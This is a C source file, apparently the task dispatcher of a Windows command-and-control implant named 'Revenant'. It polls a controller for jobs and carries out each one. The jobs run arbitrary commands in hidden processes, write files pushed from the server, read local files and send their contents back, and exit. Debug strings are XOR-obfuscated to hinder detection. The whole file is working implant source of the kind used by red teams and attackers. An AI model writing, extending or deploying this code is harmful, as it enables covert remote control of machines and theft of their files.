#include "Obfuscation.h"
#include "Revenant.h"
#include "Command.h"
#include "Package.h"
#include "Config.h"
#include "Defs.h"
#include "Core.h"
#include "Asm.h"

#include <tchar.h>
#include <stdio.h>

#define RVNT_COMMAND_LENGTH 5

RVNT_COMMAND Commands[RVNT_COMMAND_LENGTH] = {
        { .ID = COMMAND_SHELL,            .Function = CommandShell },
        { .ID = COMMAND_DOWNLOAD,         .Function = CommandDownload },
        { .ID = COMMAND_UPLOAD,           .Function = CommandUpload },
        { .ID = COMMAND_EXIT,             .Function = CommandExit },
};

VOID CommandDispatcher() {
    PPACKAGE Package     = NULL;
    PARSER   Parser      = { 0 };
    PVOID    DataBuffer  = NULL;
    SIZE_T   DataSize    = 0;
    DWORD    TaskCommand;

    do {
        if(!Instance.Session.Connected) {

//--------------------------------
#if CONFIG_OBFUSCATION
            unsigned char s_xk[] = S_XK;
            unsigned char s_string[] = S_INSTANCE_NOT_CONNECTED;
            _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
#else
            _tprintf("instance not connected!\n");
#endif
//--------------------------------

            return;
        }

        Sleep( Instance.Config.Sleeping * 1000 );

        Package = PackageCreate( COMMAND_GET_JOB );

        PackageAddInt32( Package, Instance.Session.AgentID );
        PackageTransmit( Package, &DataBuffer, &DataSize );

        if(DataBuffer && DataSize > 0) {
            PRINT_HEX(DataBuffer, (int)DataSize)
            ParserNew(&Parser, DataBuffer, DataSize);
            do {
                TaskCommand = ParserGetInt32(&Parser);
                if(TaskCommand != COMMAND_NO_JOB) {
                    _tprintf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );

                    BOOL FoundCommand = FALSE;
                    for ( UINT32 FunctionCounter = 0; FunctionCounter < RVNT_COMMAND_LENGTH; FunctionCounter++ ) {
                        if ( Commands[FunctionCounter].ID == TaskCommand) {
                            Commands[FunctionCounter].Function(&Parser);
                            FoundCommand = TRUE;
                            break;
                        }
                    }


                    if ( ! FoundCommand ) {

//--------------------------------
#if CONFIG_OBFUSCATION
                        unsigned char s_xk[] = S_XK;
                        unsigned char s_string[] = S_COMMAND_NOT_FOUND;
                        _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
#else
                        _tprintf("command not found\n");
#endif
//--------------------------------

                    }
                } else {

//--------------------------------
#if CONFIG_OBFUSCATION
                    unsigned char s_xk[] = S_XK;
                    unsigned char s_string[] = S_IS_COMMAND_NO_JOB;
                    _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
#else
                    _tprintf("Is COMMAND_NO_JOB\n");
#endif
//--------------------------------

                }
            } while ( Parser.Length > 4 );

            memset(DataBuffer, 0, DataSize);
            LocalFree(*(PVOID *)DataBuffer);
            DataBuffer = NULL;

            ParserDestroy(&Parser);
        } else {

//--------------------------------
#if CONFIG_OBFUSCATION
            unsigned char s_xk[] = S_XK;
            unsigned char s_string[] = S_TRANSPORT_FAILED;
            _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
#else
            _tprintf("Transport: Failed\n");
#endif
//--------------------------------

            break;
        }

    } while(TRUE);

    Instance.Session.Connected = FALSE;
}

VOID CommandShell( PPARSER Parser ){

//--------------------------------
#if CONFIG_OBFUSCATION
    unsigned char s_xk[] = S_XK;
    unsigned char s_string[] = S_COMMAND_SHELL;
    _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
#else
    _tprintf("Command::Shell\n");
#endif
//--------------------------------

    DWORD   Length           = 0;
    PCHAR   Command          = NULL;
    HANDLE  hStdInPipeRead   = NULL;
    HANDLE  hStdInPipeWrite  = NULL;
    HANDLE  hStdOutPipeRead  = NULL;
    HANDLE  hStdOutPipeWrite = NULL;

    PROCESS_INFORMATION ProcessInfo     = { };
    SECURITY_ATTRIBUTES SecurityAttr    = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
    STARTUPINFOA        StartUpInfoA    = { };

    Command = ParserGetBytes(Parser, (PUINT32) &Length);

    if (CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0 ) == FALSE )
        return;

    if (CreatePipe( &hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0 ) == FALSE )
        return;

    StartUpInfoA.cb         = sizeof( STARTUPINFOA );
    StartUpInfoA.dwFlags    = STARTF_USESTDHANDLES;
    StartUpInfoA.hStdError  = hStdOutPipeWrite;
    StartUpInfoA.hStdOutput = hStdOutPipeWrite;
    StartUpInfoA.hStdInput  = hStdInPipeRead;

    if ( CreateProcessA( NULL, Command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartUpInfoA, &ProcessInfo ) == FALSE )
        return;

    CloseHandle( hStdOutPipeWrite );
    CloseHandle( hStdInPipeRead );

    AnonPipeRead( hStdOutPipeRead );

    CloseHandle( hStdOutPipeRead );
    CloseHandle( hStdInPipeWrite );
}

VOID CommandUpload( PPARSER Parser ) {

//--------------------------------
#if CONFIG_OBFUSCATION
    unsigned char s_xk[] = S_XK;
    unsigned char s_string[] = S_COMMAND_UPLOAD;
    _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
#else
    _tprintf("Command::Upload\n");
#endif
//--------------------------------

    PPACKAGE Package  = PackageCreate( COMMAND_UPLOAD );
    UINT32   FileSize = 0;
    UINT32   NameSize = 0;
    DWORD    Written  = 0;
    PCHAR    FileName = ParserGetBytes( Parser, &NameSize );
    PVOID    Content  = ParserGetBytes( Parser, &FileSize );
    HANDLE   hFile    = NULL;

    FileName[ NameSize ] = 0;

    _tprintf( "FileName => %s (FileSize: %d)\n", FileName, FileSize );

    hFile = CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );

    if ( hFile == INVALID_HANDLE_VALUE ) {
        _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
        goto Cleanup;
    }

    if ( ! WriteFile( hFile, Content, FileSize, &Written, NULL)) {
        _tprintf( "[*] WriteFile: Failed[%ld]\n", GetLastError() );
        goto Cleanup;
    }

    PackageAddInt32( Package, FileSize );
    PackageAddBytes( Package, (PUCHAR)FileName, NameSize );
    PackageTransmit( Package, NULL, NULL );

    Cleanup:
    CloseHandle( hFile );
    hFile = NULL;
}


VOID CommandDownload( PPARSER Parser ) {

//--------------------------------
#if CONFIG_OBFUSCATION
    unsigned char s_xk[] = S_XK;
    unsigned char s_string[] = S_COMMAND_DOWNLOAD;
    _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
#else
    _tprintf("Command::Download\n");
#endif
//--------------------------------

    PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
    DWORD    FileSize = 0;
    DWORD    Read     = 0;
    DWORD    NameSize = 0;
    PCHAR    FileName = ParserGetBytes(Parser, (PUINT32) &NameSize);
    HANDLE   hFile    = NULL;
    PVOID    Content  = NULL;

    FileName[ NameSize ] = 0;

    _tprintf( "FileName => %s\n", FileName );

    hFile = CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
    if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
    {
        _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
        goto CleanupDownload;
    }

    FileSize = GetFileSize( hFile, 0 );
    Content  = LocalAlloc( LPTR, FileSize );

    if ( ! ReadFile( hFile, Content, FileSize, &Read, NULL ) )
    {
        _tprintf( "[*] ReadFile: Failed[%ld]\n", GetLastError() );
        goto CleanupDownload;
    }

    PackageAddBytes( Package, FileName, NameSize );
    PackageAddBytes( Package, Content,  FileSize );

    PackageTransmit( Package, NULL, NULL );

    CleanupDownload:
    if ( hFile ){
        CloseHandle( hFile );
        hFile = NULL;
    }

    if ( Content ){
        memset( Content, 0, FileSize );
        LocalFree( Content );
        Content = NULL;
    }
}

VOID CommandExit( PPARSER Parser ) {

//--------------------------------
#if CONFIG_OBFUSCATION
    unsigned char s_xk[] = S_XK;
    unsigned char s_string[] = S_COMMAND_EXIT;
    _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
#else
    _tprintf( "Command::Exit\n");
#endif
//--------------------------------

    ExitProcess( 0 );
}
